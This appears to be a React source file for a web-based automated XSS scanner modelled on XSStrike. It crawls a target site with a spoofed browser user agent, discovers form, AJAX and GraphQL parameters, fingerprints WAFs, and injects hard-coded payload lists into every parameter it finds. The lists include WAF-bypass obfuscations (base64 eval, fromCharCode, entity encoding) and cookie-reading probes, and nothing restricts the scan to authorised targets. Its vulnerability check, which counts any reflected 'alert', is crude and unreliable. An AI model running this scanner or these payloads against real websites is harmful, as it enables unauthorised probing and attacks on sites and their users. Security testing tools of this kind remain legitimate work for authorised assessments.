"use client";

import React, { useState, useRef, useEffect } from "react";
import * as DropdownMenu from "@radix-ui/react-dropdown-menu";
import { Check, ChevronDown, Terminal, AlertCircle, Shield, ArrowRight, Globe, Code, Zap, FileText, Settings, Search, FileWarning, ExternalLink, BookOpen } from "lucide-react";
import { motion } from "framer-motion";
import { Prism as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomDark } from "react-syntax-highlighter/dist/esm/styles/prism";

// Context-aware and WAF evasion focused payloads inspired by XSStrike
const xssPayloads = {
  "Basic XSS Payloads": [
    '<script>alert(1)</script>',
    `"><script>alert(1)</script>`,
    `'><script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `"><img src=x onerror=alert(1)>`,
    `'><img src=x onerror=alert(1)>`
  ],
  "Context-Based Payloads": [
    // HTML context payloads
    `<svg onload=alert(1)>`,
    `<body onload=alert(1)>`,
    // JavaScript context payloads
    `'-alert(1)-'`,
    `';alert(1)//`,
    `\`;alert(1);//`,
    // Attribute context payloads
    `" onmouseover="alert(1)`,
    `" autofocus onfocus="alert(1)`,
    `" onfocus="alert(1)" autofocus="`,
    // URL context payloads
    `javascript:alert(1)`,
    `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
  ],
  "WAF Bypass Payloads": [
    // Obfuscation techniques
    `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
    `<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>`,
    // HTML entity encoding
    `<iframe src="javascript&#58;alert(1)">`,
    `<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`,
    // Exotic variations from XSStrike
    `}]};(confirm)()//\\`,
    `<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z`,
    `</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)\`\`>z`,
    `</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//`
  ],
  "DOM XSS Payloads": [
    `<img src=x onerror=alert(document.domain)>`,
    `<svg onload=alert(document.cookie)>`,
    `location='javascript:alert(1)'`,
    `<iframe src="javascript:alert(document.domain)"></iframe>`,
    `<script>document.getElementById('x').innerHTML=location.hash.slice(1)</script>`,
    `#<img src=x onerror=alert(1)>`
  ]
};

// WAF detection patterns based on response characteristics
const wafDetectionPatterns = [
  { pattern: "mod_security", name: "ModSecurity" },
  { pattern: "cloudflare", name: "Cloudflare" },
  { pattern: "sucuri", name: "Sucuri" },
  { pattern: "wordfence", name: "Wordfence" },
  { pattern: "imperva", name: "Imperva" },
  { pattern: "akamai", name: "Akamai" },
  { pattern: "fortinet", name: "FortiWeb" }
];

// Context detection regex patterns
const contextPatterns = {
  htmlContext: /<\w+.*?>/g,
  jsContext: /<script.*?>.*?<\/script>/g,
  attributeContext: /\s(\w+)\s*=\s*["']([^"']*)["']/g,
  urlContext: /(https?:\/\/[^"'<>]+)/g
};

// After the contextPatterns object, add these new functions for crawling and parameter discovery
const crawlWebsite = async (domain: string, maxUrls = 20, maxDepth = 2) => {
  const seenUrls = new Set<string>();
  const urlsToVisit: { url: string; depth: number }[] = [{ url: domain, depth: 0 }];
  const discoveredUrls: string[] = [];
  
  // Parse the original domain to determine base domain for subdomain handling
  let baseUrl: URL;
  try {
    baseUrl = new URL(domain);
    // Extract base domain (e.g., example.com from sub.example.com)
    const baseDomain = baseUrl.hostname.split('.').slice(-2).join('.');
    
    // Log the starting point
    console.log(`Starting crawl from ${domain} with max depth ${maxDepth}`);
    
  } catch (error) {
    console.error("Invalid domain URL:", domain);
    return [];
  }
  
  while (urlsToVisit.length > 0 && discoveredUrls.length < maxUrls) {
    const { url, depth } = urlsToVisit.shift()!;
    
    if (seenUrls.has(url) || depth > maxDepth) continue;
    seenUrls.add(url);
    
    try {
      // Add a timeout to avoid hanging on slow requests - increase to 10 seconds
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
      
      console.log(`Crawling ${url} at depth ${depth}`);
      
      const response = await fetch(url, { 
        redirect: 'follow',
        signal: controller.signal,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      clearTimeout(timeoutId);
      
      // Skip handling non-success responses
      if (!response.ok) {
        console.log(`Got non-success status ${response.status} for ${url}`);
        continue;
      }
      
      // Check content type - more permissive to catch misclassified HTML
      const contentType = response.headers.get('content-type') || '';
      if (contentType.includes('image/') || 
          contentType.includes('audio/') || 
          contentType.includes('video/') || 
          contentType.includes('application/octet-stream')) {
        console.log(`Skipping non-parseable content type: ${contentType}`);
        continue;
      }
      
      const html = await response.text();
      discoveredUrls.push(url);
      
      // Only process links if we're not at max depth yet
      if (depth < maxDepth) {
        // Extract links using regex instead of DOM parser
        const patterns = [
          /<a[^>]*href=["']([^"']+)["'][^>]*>/gi,       // <a href="...">
          /<area[^>]*href=["']([^"']+)["'][^>]*>/gi,    // <area href="...">
          /<form[^>]*action=["']([^"']+)["'][^>]*>/gi,  // <form action="...">
          /window\.location\s*=\s*['"]([^'"]+)['"]/g,   // window.location = "..."
          /location\.href\s*=\s*['"]([^'"]+)['"]/g,     // location.href = "..."
          /navigate\(['"]([^'"]+)['"]\)/g,              // navigate("...")
          /history\.pushState\([^,]*,\s*[^,]*,\s*['"]([^'"]+)['"]\)/g // history.pushState(..., ..., "...")
        ];
        
        for (const pattern of patterns) {
          let match;
          while ((match = pattern.exec(html)) !== null) {
            if (!match[1]) continue;
            
            const href = match[1];
            if (href.startsWith('javascript:') || href.startsWith('mailto:') || href.startsWith('tel:')) continue;
            
            try {
              // Handle relative URLs properly
              let newUrl: URL;
              try {
                newUrl = new URL(href, url);
              } catch {
                continue; // Skip invalid URLs
              }
              
              // Check if URL should be crawled
              // Relaxed same-origin policy - allow subdomains of same base domain
              const newUrlHostname = newUrl.hostname;
              const newUrlPathname = newUrl.pathname;
              
              const shouldCrawl = 
                // Same origin
                (newUrl.origin === baseUrl.origin) ||
                // Or subdomain
                (newUrlHostname.includes(baseUrl.hostname)) ||
                // Or same domain with different protocol
                (newUrlHostname === baseUrl.hostname);
              
              if (shouldCrawl && !seenUrls.has(newUrl.href)) {
                // Skip some common file extensions that are unlikely to contain links
                const skipExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.zip', '.mp3', '.mp4'];
                const hasSkipExtension = skipExtensions.some(ext => newUrlPathname.toLowerCase().endsWith(ext));
                
                if (!hasSkipExtension) {
                  urlsToVisit.push({ url: newUrl.href, depth: depth + 1 });
                }
              }
            } catch (error) {
              console.error(`Error processing URL ${href}:`, error);
            }
          }
        }
      }
    } catch (error) {
      console.error(`Error crawling ${url}:`, error);
    }
  }
  
  console.log(`Crawling complete. Found ${discoveredUrls.length} URLs`);
  return discoveredUrls;
};

/**
 * Finds injectable parameters in a URL
 */
const findParameters = async (url: string): Promise<string[]> => {
  const parameters: string[] = [];
  
  try {
    // Extract parameters from the URL query string
    const urlObj = new URL(url);
    urlObj.searchParams.forEach((_, key) => {
      parameters.push(key);
    });
    
    // Extract potential parameters from URL path segments (improved for REST APIs)
    const pathSegments = urlObj.pathname.split('/').filter(Boolean);
    
    // Common REST API patterns
    const apiPatterns = [
      // Check for ID patterns (numeric, UUID, etc.)
      { pattern: /^[0-9]+$/, name: 'id' },
      { pattern: /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i, name: 'uuid' },
      { pattern: /^[0-9a-f]{24}$/i, name: 'objectId' },
      // Slugs and username patterns
      { pattern: /^[a-z0-9_-]+$/i, name: 'slug' },
      // Date patterns
      { pattern: /^\d{4}-\d{2}-\d{2}$/, name: 'date' }
    ];
    
    // Check for REST API endpoint patterns
    pathSegments.forEach((segment, index) => {
      // Try to identify the potential parameter type based on patterns
      for (const { pattern, name } of apiPatterns) {
        if (pattern.test(segment)) {
          parameters.push(`path_${name}_${index}`);
          break;
        }
      }
      
      // If none of the patterns matched but it's alphanumeric, still consider it
      if (/^[a-zA-Z0-9_-]+$/.test(segment) && !parameters.includes(`path_param_${index}`)) {
        parameters.push(`path_param_${index}`);
      }
    });
    
    // Check for RESTful API patterns in the path structure
    const restPathPattern = /\/(api|v[0-9]+|rest)\//i;
    if (restPathPattern.test(urlObj.pathname)) {
      const apiEndpointMatch = urlObj.pathname.match(/\/([a-zA-Z0-9_-]+)\/([a-zA-Z0-9_-]+)(?:\/|$)/g);
      if (apiEndpointMatch) {
        apiEndpointMatch.forEach(match => {
          const parts = match.split('/').filter(Boolean);
          if (parts.length >= 2) {
            // The second part is often the resource ID
            parameters.push(`${parts[0]}_id`);
          }
        });
      }
    }
    
    // Fetch the page to find form fields and JS parameters
    try {
      const response = await fetch(url);
      const html = await response.text();
      
      // Extract form fields using regex instead of DOM parser
      // Find <input> elements and their name attributes
      const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
      let inputMatch;
      while ((inputMatch = inputRegex.exec(html)) !== null) {
        if (inputMatch[1] && !parameters.includes(inputMatch[1])) {
          parameters.push(inputMatch[1]);
        }
      }
      
      // Find <select> elements
      const selectRegex = /<select[^>]*name=["']([^"']+)["'][^>]*>/gi;
      let selectMatch;
      while ((selectMatch = selectRegex.exec(html)) !== null) {
        if (selectMatch[1] && !parameters.includes(selectMatch[1])) {
          parameters.push(selectMatch[1]);
        }
      }
      
      // Find <textarea> elements
      const textareaRegex = /<textarea[^>]*name=["']([^"']+)["'][^>]*>/gi;
      let textareaMatch;
      while ((textareaMatch = textareaRegex.exec(html)) !== null) {
        if (textareaMatch[1] && !parameters.includes(textareaMatch[1])) {
          parameters.push(textareaMatch[1]);
        }
      }
      
      // Also find form fields with data attributes
      const dataFieldRegex = /data-(field|param|name)=["']([^"']+)["']/gi;
      let dataFieldMatch;
      while ((dataFieldMatch = dataFieldRegex.exec(html)) !== null) {
        if (dataFieldMatch[2] && !parameters.includes(dataFieldMatch[2])) {
          parameters.push(dataFieldMatch[2]);
        }
      }
      
      // Parse JavaScript for potential AJAX parameters
      // Extract <script> content
      const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
      let scriptMatch;
      let scriptContents = '';
      
      while ((scriptMatch = scriptRegex.exec(html)) !== null) {
        if (scriptMatch[1]) {
          scriptContents += scriptMatch[1] + '\n';
        }
      }
      
      // Process script contents for parameters
      if (scriptContents) {
        // Regular parameter patterns
        const ajaxParamRegex = /['"]([\w-]+)['"]:\s*|\.get\(['"]([\w-]+)['"]\)|\.post\(['"]([\w-]+)['"]\)|\.ajax\([^)]*['"]data['"]:\s*{([^}]*)}/g;
        let ajaxMatch;
        
        while ((ajaxMatch = ajaxParamRegex.exec(scriptContents)) !== null) {
          // Extract parameter names
          for (let i = 1; i < ajaxMatch.length; i++) {
            if (ajaxMatch[i] && !parameters.includes(ajaxMatch[i])) {
              // Clean up the match
              const paramName = ajaxMatch[i].trim().replace(/['"]/g, '');
              if (paramName && !parameters.includes(paramName)) {
                parameters.push(paramName);
              }
            }
          }
          
          // If we have a data object from AJAX, parse its properties
          if (ajaxMatch[4]) {
            const dataProps = ajaxMatch[4].match(/['"]([^'"]+)['"]/g);
            if (dataProps) {
              dataProps.forEach(prop => {
                const cleanProp = prop.replace(/['"]/g, '');
                if (cleanProp && !parameters.includes(cleanProp)) {
                  parameters.push(cleanProp);
                }
              });
            }
          }
        }
        
        // Fetch API patterns
        const fetchRegex = /fetch\([^,]*,\s*{[^}]*body[^}]*}\)/g;
        let fetchMatch;
        
        while ((fetchMatch = fetchRegex.exec(scriptContents)) !== null) {
          // Look for JSON.stringify or FormData within fetch
          const bodyContentRegex = /body:\s*(?:JSON\.stringify\(([^)]+)\)|new FormData\(([^)]+)\))/;
          const bodyMatch = fetchMatch[0].match(bodyContentRegex);
          
          if (bodyMatch) {
            // Extract potential parameter names from the content
            const paramNameRegex = /['"]([a-zA-Z0-9_-]+)['"]/g;
            let paramMatch;
            
            while ((paramMatch = paramNameRegex.exec(bodyMatch[0])) !== null) {
              if (paramMatch[1] && !parameters.includes(paramMatch[1])) {
                parameters.push(paramMatch[1]);
              }
            }
          }
        }
        
        // JSON.stringify patterns for request bodies
        const jsonStringifyRegex = /JSON\.stringify\({([^}]*)}\)/g;
        let jsonMatch;
        
        while ((jsonMatch = jsonStringifyRegex.exec(scriptContents)) !== null) {
          if (jsonMatch[1]) {
            // Extract key-value pairs
            const keyValueRegex = /['"]([^'"]+)['"]:/g;
            let keyMatch;
            
            while ((keyMatch = keyValueRegex.exec(jsonMatch[1])) !== null) {
              if (keyMatch[1] && !parameters.includes(keyMatch[1])) {
                parameters.push(keyMatch[1]);
              }
            }
          }
        }
        
        // GraphQL query parameters
        const graphqlRegex = /query[^{]*{([^}]*)}/g;
        let graphqlMatch;
        
        while ((graphqlMatch = graphqlRegex.exec(scriptContents)) !== null) {
          if (graphqlMatch[1]) {
            // Extract field names
            const fieldRegex = /([a-zA-Z0-9_]+)(?:\(|\s*{)/g;
            let fieldMatch;
            
            while ((fieldMatch = fieldRegex.exec(graphqlMatch[1])) !== null) {
              if (fieldMatch[1] && !parameters.includes(fieldMatch[1])) {
                parameters.push(fieldMatch[1]);
              }
            }
          }
        }
        
        // Route parameters in modern frameworks
        const routeRegex = /\/:([a-zA-Z0-9_-]+)/g;
        let routeMatch;
        
        while ((routeMatch = routeRegex.exec(scriptContents)) !== null) {
          if (routeMatch[1] && !parameters.includes(routeMatch[1])) {
            parameters.push(routeMatch[1]);
          }
        }
      }
      
      // Check for meta tags
      const metaRegex = /<meta[^>]*name=["']([^"']+)["'][^>]*>/gi;
      let metaMatch;
      
      while ((metaMatch = metaRegex.exec(html)) !== null) {
        if (metaMatch[1] && !parameters.includes(metaMatch[1])) {
          parameters.push(metaMatch[1]);
        }
      }
      
      // Check for common API parameter names if URL looks like an API
      if (url.includes('/api/') || url.includes('/rest/') || url.includes('/graphql')) {
        const commonApiParams = [
          'id', 'uuid', 'limit', 'offset', 'page', 'per_page', 'q', 'query', 
          'filter', 'sort', 'order', 'include', 'fields', 'token', 'api_key'
        ];
        
        for (const param of commonApiParams) {
          if (!parameters.includes(param)) {
            parameters.push(param);
          }
        }
      }
    } catch (error) {
      console.error(`Error fetching or parsing HTML from ${url}:`, error);
    }
  } catch (error) {
    console.error(`Error processing URL ${url}:`, error);
  }
  
  // Return the unique parameters found
  return [...new Set(parameters)];
};

// Auto-generate payloads based on context
const generateSmartPayloads = (context: string) => {
  const smartPayloads: string[] = [];
  
  // Common payloads that work in most contexts
  const basePayloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
  ];
  
  // Add context-specific payloads
  switch (context) {
    case "JavaScript":
      smartPayloads.push(
        "'-alert(1)-'",
        "';alert(1)//",
        "\\';alert(1)//",
        "\\u0027+alert(1)+\\u0027"
      );
      break;
    case "Attribute":
      smartPayloads.push(
        "\" onmouseover=\"alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\" onmouseenter=\"alert(1)",
        "\"><img src=x onerror=\"alert(1)\">"
      );
      break;
    case "URL":
      smartPayloads.push(
        "javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      );
      break;
    case "HTML":
    default:
      smartPayloads.push(
        "<iframe onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x></animate></svg>"
      );
      break;
  }
  
  // WAF bypass payloads - add regardless of context
  smartPayloads.push(
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "</script><svg/onload=alert(1)>",
    "<A%0aONMouseOvER%0d=%0d[8].find(confirm)>test",
    "}]};(alert)(1)//\\"
  );
  
  // Combine all payloads and remove duplicates
  return [...new Set([...basePayloads, ...smartPayloads])];
};

/**
 * URL structure definition
 */
interface UrlParts {
  url: string;
  baseUrl: string;
  path: string;
  parameters: string[];
}

/**
 * Scan result definition
 */
interface ScanResult {
  url: string;
  vulnerable: boolean;
  vulnerableParams: string[];
  context: string | null;
  waf: string | null;
}

const XssClientWrapper = () => {
  const [selectedList, setSelectedList] = useState("Basic XSS Payloads");
  const [url, setUrl] = useState("");
  const [logs, setLogs] = useState<string[]>([]);
  const [results, setResults] = useState<any[]>([]);
  const [isScanning, setIsScanning] = useState(false);
  const [detectedContext, setDetectedContext] = useState<string>("");
  const [detectedWaf, setDetectedWaf] = useState<string>("");
  const [crawlStatus, setCrawlStatus] = useState({ 
    isCrawling: false, 
    urlsFound: 0, 
    paramsFound: 0 
  });
  const [scanMode, setScanMode] = useState<"manual" | "auto">("auto");
  const [advancedOptions, setAdvancedOptions] = useState({
    detectContext: true,
    detectWaf: true,
    adaptivePayloads: true,
    requestDelay: 500, // ms
    followRedirects: true,
    scanParameters: true,
    crawlDepth: 2,
    maxUrls: 20
  });
  const terminalRef = useRef<HTMLDivElement>(null);
  const [autoScanUrl, setAutoScanUrl] = useState("");

  // Auto-scroll to bottom of terminal
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [logs]);

  // Helper to analyze response for context detection
  const detectContext = (responseBody: string) => {
    // Default to HTML context if we can't determine
    let detectedContext = "HTML";
    
    // Check for JavaScript context
    if (responseBody.includes("<script") && contextPatterns.jsContext.test(responseBody)) {
      detectedContext = "JavaScript";
    }
    // Check for attribute context
    else if (url.includes("XSS_TEST") && responseBody.match(contextPatterns.attributeContext)) {
      detectedContext = "Attribute";
    }
    // Check for URL context
    else if (url.includes("XSS_TEST") && contextPatterns.urlContext.test(responseBody)) {
      detectedContext = "URL";
    }
    
    return detectedContext;
  };

  // Helper to detect WAF
  const detectWaf = (response: Response) => {
    const headers = Object.fromEntries(response.headers.entries());
    const headerString = JSON.stringify(headers).toLowerCase();
    const responseText = response.statusText.toLowerCase();
    
    // Check headers for WAF signatures
    for (const waf of wafDetectionPatterns) {
      if (headerString.includes(waf.pattern.toLowerCase())) {
        return waf.name;
      }
    }
    
    // Check for common response patterns
    if (response.status === 403 || response.status === 406) {
      return "Unknown WAF (Blocked Request)";
    }
    
    return "No WAF Detected";
  };

  // Get context-appropriate payloads
  const getContextPayloads = (context: string) => {
    if (!advancedOptions.adaptivePayloads) {
      return xssPayloads[selectedList as keyof typeof xssPayloads];
    }
    
    const contextPayloads = xssPayloads["Context-Based Payloads"];
    
    switch(context) {
      case "JavaScript":
        return contextPayloads.filter(p => p.includes("alert") && (p.includes("'") || p.includes(";") || p.includes("`")));
      case "Attribute":
        return contextPayloads.filter(p => p.includes("onmouseover") || p.includes("onfocus") || p.includes("autofocus"));
      case "URL":
        return contextPayloads.filter(p => p.includes("javascript:") || p.includes("data:"));
      default: // HTML
        return contextPayloads.filter(p => p.includes("<") || p.includes(">")); 
    }
  };

  // Extract parameters from URL for parameter scanning
  const extractParameters = (url: string) => {
    const urlObj = new URL(url);
    const params = Array.from(urlObj.searchParams.keys());
    return params;
  };

  // Modify URL for parameter scanning
  const insertPayloadIntoParam = (baseUrl: string, param: string, payload: string) => {
    const urlObj = new URL(baseUrl);
    urlObj.searchParams.set(param, payload);
    return urlObj.toString();
  };

  /**
   * Detect the context and WAF for a given URL
   */
  const detectContextAndWaf = async (url: string): Promise<{ context: string | null, waf: string | null }> => {
    try {
      // Fetch the page content
      const response = await fetch(url);
      const body = await response.text();
      
      // Detect WAF
      const waf = detectWaf(response);
      
      // Detect context
      const context = detectContext(body);
      
      return { context, waf };
    } catch (error) {
      console.error("Error detecting context and WAF:", error);
      return { context: null, waf: null };
    }
  };

  /**
   * Test a specific parameter with a given payload
   */
  const testParameter = async (url: string, param: string, payload: string): Promise<{ vulnerable: boolean }> => {
    try {
      const testUrl = insertPayloadIntoParam(url, param, payload);
      
      const response = await fetch(testUrl, {
        redirect: advancedOptions.followRedirects ? 'follow' : 'manual',
      });
      
      const body = await response.text();
      
      // Check for successful injection
      const isVulnerable = 
        body.includes(payload) || 
        body.includes("alert(1)") || 
        body.includes("alert(document.domain)") ||
        (payload.includes("alert") && body.includes("alert"));
      
      return { vulnerable: isVulnerable };
    } catch (error) {
      console.error(`Error testing parameter ${param} with payload:`, error);
      return { vulnerable: false };
    }
  };

  /**
   * Scans a URL for XSS vulnerabilities
   */
  const scanForXSS = async (url: string, parameters: string[] = []): Promise<ScanResult> => {
    setLogs(prev => [...prev, `Starting scan of ${url}`]);
    
    let foundParams: string[] = [...parameters];
    
    // If no parameters provided, find them
    if (foundParams.length === 0) {
      setLogs(prev => [...prev, `Finding injectable parameters...`]);
      foundParams = await findParameters(url);
      setLogs(prev => [...prev, `Found ${foundParams.length} potential parameters: ${foundParams.join(', ')}`]);
    }
    
    if (foundParams.length === 0) {
      setLogs(prev => [...prev, `No injectable parameters found for ${url}`]);
      return {
        url,
        vulnerable: false,
        vulnerableParams: [],
        context: null,
        waf: null
      };
    }
    
    // Detect context and WAF
    setLogs(prev => [...prev, `Sending initial request to detect context and WAF...`]);
    const { context, waf } = await detectContextAndWaf(url);
    setLogs(prev => [...prev, `Detected context: ${context || 'None'}`]);
    setLogs(prev => [...prev, `Detected WAF: ${waf || 'None'}`]);
    
    // Determine which payloads to use based on context
    let payloadsToUse: string[] = [];
    if (context) {
      // Use context-specific payloads if context was detected
      payloadsToUse = getContextPayloads(context);
      setLogs(prev => [...prev, `Using context-specific payloads for ${context}`]);
    } else {
      // Fall back to basic payloads
      payloadsToUse = xssPayloads["Basic XSS Payloads"];
      setLogs(prev => [...prev, `Using basic XSS payloads`]);
    }
    
    // If WAF was detected, add WAF bypass payloads
    if (waf) {
      payloadsToUse = [...payloadsToUse, ...xssPayloads["WAF Bypass Payloads"]];
      setLogs(prev => [...prev, `Added WAF bypass payloads`]);
    }
    
    // Test each parameter with each payload
    const vulnerableParams: string[] = [];
    
    setLogs(prev => [...prev, `Testing ${foundParams.length} parameters with ${payloadsToUse.length} payloads...`]);
    
    for (const param of foundParams) {
      let isVulnerable = false;
      
      for (const payload of payloadsToUse) {
        setLogs(prev => [...prev, `Testing parameter "${param}" with payload: ${payload}`]);
        
        try {
          const result = await testParameter(url, param, payload);
          
          if (result.vulnerable) {
            isVulnerable = true;
            setLogs(prev => [...prev, `✓ VULNERABLE: Parameter "${param}" is vulnerable to XSS with payload: ${payload}`]);
            break; // No need to test more payloads for this parameter
          }
        } catch (error) {
          console.error(`Error testing parameter ${param}:`, error);
          setLogs(prev => [...prev, `Error testing parameter ${param}: ${error}`]);
        }
      }
      
      if (isVulnerable && !vulnerableParams.includes(param)) {
        vulnerableParams.push(param);
      }
    }
    
    if (vulnerableParams.length > 0) {
      setLogs(prev => [...prev, `Found ${vulnerableParams.length} vulnerable parameters: ${vulnerableParams.join(', ')}`]);
    } else {
      setLogs(prev => [...prev, `No XSS vulnerabilities found for ${url}`]);
    }
    
    return {
      url,
      vulnerable: vulnerableParams.length > 0,
      vulnerableParams,
      context,
      waf
    };
  };

  // Auto-scan function that crawls a website and tests all parameters
  const autoScan = async () => {
    try {
      let targetUrl = autoScanUrl;
      if (!targetUrl.startsWith("http")) {
        targetUrl = "https://" + targetUrl;
      }

    setIsScanning(true);
    setResults([]);
      setLogs([`➜ Starting auto-scan for ${targetUrl}`]);
      
      // Step 1: Crawl the website to discover URLs
      setCrawlStatus({ isCrawling: true, urlsFound: 0, paramsFound: 0 });
      setLogs(prev => [...prev, `➜ Crawling website to discover URLs (max depth: ${advancedOptions.crawlDepth})...`]);
      
      const discoveredUrls = await crawlWebsite(
        targetUrl, 
        advancedOptions.maxUrls,
        advancedOptions.crawlDepth
      );
      
      setCrawlStatus(prev => ({ ...prev, urlsFound: discoveredUrls.length }));
      setLogs(prev => [...prev, `✅ Found ${discoveredUrls.length} URLs on the website`]);
      
      // Step 2: Find parameters in discovered URLs
      setLogs(prev => [...prev, `➜ Analyzing URLs to find injectable parameters...`]);
      
      // Create a structure to hold URLs and their parameters
      interface UrlWithParams {
        url: string;
        parameters: string[];
      }
      
      const urlsWithParameters: UrlWithParams[] = [];
      let totalParams = 0;
      
      // Process each URL to find parameters
      for (const url of discoveredUrls) {
        setLogs(prev => [...prev, `➜ Analyzing parameters in: ${url.substring(0, 50)}...`]);
        const parameters = await findParameters(url);
        
        if (parameters.length > 0) {
          urlsWithParameters.push({ url, parameters });
          totalParams += parameters.length;
          
          setLogs(prev => [...prev, `✅ Found ${parameters.length} parameters in ${url.substring(0, 40)}...`]);
        }
      }
      
      setCrawlStatus(prev => ({ ...prev, paramsFound: totalParams }));
      setLogs(prev => [...prev, `✅ Found ${totalParams} potential injectable parameters across ${urlsWithParameters.length} URLs`]);
      
      // Step 3: Test each URL with parameters for XSS
      setLogs(prev => [...prev, `➜ Testing parameters for XSS vulnerabilities...`]);
      
      if (urlsWithParameters.length === 0) {
        setLogs(prev => [...prev, `⚠️ No injectable parameters found. Try increasing crawl depth or manually specify a URL.`]);
        setIsScanning(false);
        setCrawlStatus(prev => ({ ...prev, isCrawling: false }));
        return;
      }
      
      let vulnerabilitiesFound = 0;
      let testedUrls = 0;
      
      // Test each URL with parameters
      for (const { url, parameters } of urlsWithParameters) {
        testedUrls++;
        setLogs(prev => [...prev, `➜ Testing URL ${testedUrls}/${urlsWithParameters.length}: ${url.substring(0, 50)}...`]);
        
        try {
          // First, detect context and WAF
          const initialResponse = await fetch(url);
          const initialBody = await initialResponse.text();
          
          // Detect WAF if option enabled
          if (advancedOptions.detectWaf) {
            const waf = detectWaf(initialResponse);
            if (waf !== "No WAF Detected") {
              setLogs(prev => [...prev, `ℹ️ WAF detected on ${url.substring(0, 30)}...: ${waf}`]);
            }
          }
          
          // Detect context
          const context = detectContext(initialBody);
          
          // Generate smart payloads based on context
          const payloads = generateSmartPayloads(context);
          
          // Test each parameter with payloads
          for (const param of parameters) {
    for (const payload of payloads) {
              // Apply delay between requests
              if (advancedOptions.requestDelay > 0) {
                await new Promise(resolve => setTimeout(resolve, advancedOptions.requestDelay));
              }
              
              try {
                // Create a URL with the payload injected into the parameter
                let testUrl = url;
                
                // Handle URL parameters vs path parameters
                if (param.startsWith('path_param_')) {
                  // For path parameters, replace the segment in the path
                  const pathIndex = parseInt(param.split('_')[2]);
                  const urlObj = new URL(url);
                  const pathSegments = urlObj.pathname.split('/').filter(Boolean);
                  
                  if (pathSegments.length > pathIndex) {
                    pathSegments[pathIndex] = encodeURIComponent(payload);
                    urlObj.pathname = '/' + pathSegments.join('/');
                    testUrl = urlObj.toString();
                  }
        } else {
                  // For regular parameters
                  const urlObj = new URL(url);
                  
                  if (urlObj.searchParams.has(param)) {
                    // If parameter exists in URL, replace its value
                    urlObj.searchParams.set(param, payload);
                    testUrl = urlObj.toString();
                  } else {
                    // If parameter doesn't exist in URL (might be from form/JS detection)
                    // Try to append it as a query parameter
                    urlObj.searchParams.append(param, payload);
                    testUrl = urlObj.toString();
                  }
                }
                
                const response = await fetch(testUrl, {
                  redirect: advancedOptions.followRedirects ? 'follow' : 'manual',
                });
                
                const body = await response.text();
                
                // Check for successful XSS
                const isVulnerable = 
                  body.includes(payload) || 
                  body.includes(payload.replace("<", "&lt;").replace(">", "&gt;")) || 
                  (payload.includes("alert") && body.includes("alert"));
                
                if (isVulnerable) {
                  vulnerabilitiesFound++;
                  setResults(prev => [...prev, { 
                    url: testUrl, 
                    payload, 
                    vulnerable: true,
                    parameter: param,
                    context
                  }]);
                  setLogs(prev => [...prev, `✅ XSS vulnerability found: ${testUrl.substring(0, 50)}...`]);
                  
                  // Break after finding vulnerability to avoid flooding the target
                  break;
        }
      } catch (error) {
                setLogs(prev => [...prev, `⚠️ Error testing payload on parameter ${param} at ${url.substring(0, 30)}...: ${error}`]);
              }
            }
          }
          
        } catch (error) {
          setLogs(prev => [...prev, `⚠️ Error testing ${url.substring(0, 30)}...: ${error}`]);
        }
      }
      
      setCrawlStatus(prev => ({ ...prev, isCrawling: false }));
      setLogs(prev => [
        ...prev, 
        `➜ Scan completed: Tested ${testedUrls} URLs with ${totalParams} parameters, found ${vulnerabilitiesFound} XSS vulnerabilities`
      ]);
      
    } catch (error) {
      setLogs(prev => [...prev, `⚠️ Error during auto-scan: ${error}`]);
      setCrawlStatus(prev => ({ ...prev, isCrawling: false }));
    }

    setIsScanning(false);
  };

  const handleScanClick = async (event: React.MouseEvent<HTMLButtonElement>) => {
    setIsScanning(true);
    setResults([]);
    
    try {
      if (scanMode === "manual") {
        const result = await scanForXSS(url, []);
        setResults([result]);
      } else {
        await autoScan();
      }
    } catch (error) {
      console.error("Error during scan:", error);
      setLogs(prev => [...prev, `Error during scan: ${error}`]);
    } finally {
      setIsScanning(false);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !isScanning) {
      if (scanMode === "auto") {
        autoScan();
      } else {
        scanForXSS(url);
      }
    }
  };

  const toggleAdvancedOption = (option: keyof typeof advancedOptions) => {
    setAdvancedOptions(prev => ({
      ...prev,
      [option]: !prev[option]
    }));
  };

  return (
    <div className="relative min-h-screen w-full flex flex-col items-center justify-start bg-black overflow-hidden text-white">
      {/* Section 1: Dark Background - Scanner Controls */}
      <div className="w-full">
        {/* Background Elements */}
        <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center [mask-image:linear-gradient(to_bottom,transparent,black)] opacity-20"></div>
        
        {/* Animated Gradient Orbs */}
